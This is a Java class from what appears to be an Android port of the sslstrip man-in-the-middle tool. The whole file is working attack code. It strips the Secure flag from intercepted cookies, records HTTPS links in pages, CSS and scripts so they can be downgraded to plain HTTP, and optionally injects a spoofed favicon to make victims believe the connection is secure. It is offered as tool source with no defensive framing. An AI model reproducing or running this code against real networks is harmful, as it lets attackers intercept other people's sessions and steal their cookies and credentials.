package com.crazyricky.androidsslstrip.sslstrip;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.crazyricky.androidsslstrip.NanoHTTPD.Response;

public class SSLServerConnection extends ServerConnection {
    Pattern cookieExpression   = Pattern.compile("([ \\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]+); ?Secure", Pattern.CASE_INSENSITIVE);
    Pattern cssExpression   = Pattern.compile("url\\(([\\w\\d:#@%/;$~_?\\+-=\\\\\\.&]+)\\)", Pattern.CASE_INSENSITIVE);
    Pattern iconExpression   = Pattern.compile("<link rel=\\\"shortcut icon\\\" .*href=\\\"([\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]+)\\\".*>", Pattern.CASE_INSENSITIVE);
    Pattern linkExpression   = Pattern.compile("<((a)|(link)|(img)|(script)|(frame)) .*((href)|(src))=\\\"([\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]+)\\\".*>", Pattern.CASE_INSENSITIVE);
    Pattern headExpression   = Pattern.compile("<head>", Pattern.CASE_INSENSITIVE);

    public SSLServerConnection(String clientIP, String url) {
        super(clientIP, url);
    }

    @Override
    protected void handleHeader(Response res, String key, String value) {
        if (key.toLowerCase().equals("set-cookie")) {
            value = value.replaceAll(cookieExpression.pattern(), "$1");
        }
        super.handleHeader(res, key, value);
    }

    private String stripFileFromPath(String path) {
        int index = path.lastIndexOf("/");
        if (index > 0) {
            return path.substring(0, index);
        }
        return "";
    }

    private String getHostFromUrl(String url) {
        int index = url.indexOf('/', 8);
        if (index > 0) {
            return url.substring(8, index);
        }
        return "";
    }

    private void buildAbsoluteLink(String link) {
        String url = link;
        String host = getHostFromUrl(mTargetURL);
        String absoluteLink = "";
        if (!link.startsWith("http") && !link.startsWith("/")) {
            absoluteLink = "http://" + host + stripFileFromPath(url) + '/'
                    + link;
        } else if (!link.startsWith("http")) {
            absoluteLink = "http://" + host + link;
        }

        if (!absoluteLink.equals("")) {
            absoluteLink = absoluteLink.replace("&amp;", "&");
            URLMonitor.getInstance().addSecureLink(mClientIP, absoluteLink);
        }
    }

    private String replaceCssLinks(String data) {
        Matcher m = cssExpression.matcher(data);
        while (m.find()) {
            String link = m.group(1);
            buildAbsoluteLink(link);
        }
        return data;
    }

    private String replaceFavicon(String data) {
        Matcher m = iconExpression.matcher(data);
        if (m.find()) {
            data = data
                    .replaceFirst(iconExpression.pattern(), "<link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">");
        } else {
            data = data
                    .replaceFirst(headExpression.pattern(), "<head><link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">");
        }
        return data;
    }

    @Override
    protected String replaceSecureLinks(String data) {
        data = super.replaceSecureLinks(data);
        data = replaceCssLinks(data);

        if (URLMonitor.getInstance().isFaviconSpoofing()) {
            data = replaceFavicon(data);
        }

        Matcher m = linkExpression.matcher(data);
        while (m.find()) {
            buildAbsoluteLink(m.group(10));
        }
        return data;
    }
}
